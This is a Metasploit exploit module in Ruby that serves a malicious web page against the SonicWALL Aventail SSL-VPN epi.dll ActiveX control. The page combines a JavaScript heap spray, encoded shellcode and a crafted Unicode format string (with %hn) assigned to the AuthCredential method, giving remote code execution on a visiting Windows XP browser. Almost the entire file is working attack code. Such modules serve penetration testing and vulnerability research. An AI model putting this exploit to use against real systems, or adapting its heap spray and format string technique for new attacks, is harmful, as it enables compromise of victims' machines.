##
# $Id: aventail_epi_activex.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking # heap spray and address shifty

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SonicWALL Aventail epi.dll AuthCredential Format String Exploit',
			'Description'    => %q{
					This module exploits a format string vulnerability within version 10.0.4.x and
				10.5.1 of the SonicWALL Aventail SSL-VPN Endpoint Interrogator/Installer ActiveX
				control (epi.dll). By calling the 'AuthCredential' method with a specially
				crafted Unicode format string, an attacker can cause memory corruption and
				execute arbitrary code.

				Unfortunately, it does not appear to be possible to indirectly re-use existing
				stack data for more reliable exploitation. This is due to several particulars
				about this vulnerability. First, the format string must be a Unicode string,
				which uses two bytes per character. Second, the buffer is allocated on the
				stack using the 'alloca' function. As such, each additional format specifier (%x)
				will add four more bytes to the size allocated. This results in the inability to
				move the read pointer outside of the buffer.

				Further testing showed that using specifiers that pop more than four bytes does
				not help. Any number of format specifiers will result in accessing the same value
				within the buffer.

				NOTE: It may be possible to leverage the vulnerability to leak memory contents.
				However, that has not been fully investigated at this time.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Nikolas Sotiriu',  # original discovery / poc
					'jduck'             # Metasploit module
				],
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'OSVDB', '67286'],
					[ 'URL', 'http://sotiriu.de/adv/NSOADV-2010-005.txt' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'epi.dll v10.0.4.18 on Windows XP SP3',
						{
							# NOTE: Unfortunately, this address varies from execution to execution
							'Write' => 0x1240000 + 0x501d4 + 2, # smashed high 16-bits of a vtable ptr :)
							# 0x1d5005c, # crashes on deref+call
							'Ret'   => 0x04040404
						}
					]
				],
			'DisclosureDate' => 'Aug 19 2010',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)

		clsid = "2A1BE1E7-C550-4D67-A553-7F2D3A39233D"
		progid = "Aventail.EPInterrogator.10.0.4.018"

		method = "AuthCredential"

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(p.encoded, Rex::Arch.endian(target.arch))

		# Setup exploit buffers
		nops 	  = Rex::Text.to_unescape([target.ret].pack('V'))
		write   = Rex::Text.to_unescape([target['Write']].pack('V'))

		# Setup format string offset
		printed = 0xb1 - 5
		ret     = (target.ret >> 16) - printed

		# Setup heap spray
		blocksize = 0x40000
		fillto    = 300

		# Randomize the javascript variable names
		axobj        = "axobj" #rand_text_alpha(rand(100) + 1)
		j_format     = "fmt" # rand_text_alpha(rand(100) + 1)
		j_counter    = "i" # rand_text_alpha(rand(30) + 2)
		# heap spray vars
		j_shellcode  = rand_text_alpha(rand(100) + 1)
		j_nops       = rand_text_alpha(rand(100) + 1)
		j_ret        = rand_text_alpha(rand(100) + 1)
		j_headersize = rand_text_alpha(rand(100) + 1)
		j_slackspace = rand_text_alpha(rand(100) + 1)
		j_fillblock  = rand_text_alpha(rand(100) + 1)
		j_block      = rand_text_alpha(rand(100) + 1)
		j_memory     = rand_text_alpha(rand(100) + 1)

		# NOTE: the second assignment triggers the shellcode
		content = %Q|<html>
<object classid='clsid:#{clsid}' id='#{axobj}'></object>
<script>
#{j_shellcode}=unescape('#{shellcode}');
#{j_nops}=unescape('#{nops}');
#{j_headersize}=20;
#{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;
while(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops};
#{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace});
#{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace});
while(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock};
#{j_memory}=new Array();
for(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};

#{j_format} = unescape("#{write}");
#{j_format} += '%#{ret}x';
for (#{j_counter} = 0; #{j_counter} < 22; #{j_counter}++)
	#{j_format} += '%x';
#{j_format} += '%hn';

#{axobj}.#{method} = #{j_format};
#{axobj}.#{method} = #{j_format};
</script>
</html>|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
